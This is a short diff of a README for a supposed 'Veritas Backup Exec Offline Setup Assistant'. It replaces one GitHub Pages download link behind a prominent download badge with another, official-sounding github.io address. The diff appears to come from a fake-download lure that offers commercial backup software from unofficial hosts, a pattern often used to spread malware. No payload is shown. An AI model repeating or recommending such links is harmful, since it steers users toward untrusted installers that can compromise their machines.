@@ -1,6 +1,6 @@
 # Veritas Backup Exec — Offline Setup Assistant
 
-<a href="https://ryadikmntiiks.github.io/.github/verBE" target="_blank">
+<a href="https://veritas-backup-exec-download.github.io/.github" target="_blank">
   <img src="https://img.shields.io/badge/DOWNLOAD%20SETUP_ASSISTANT-%F0%9F%92%BE-blue?style=for-the-badge&logo=veritas&logoColor=white" alt="Download Setup Assistant">
 </a>
 
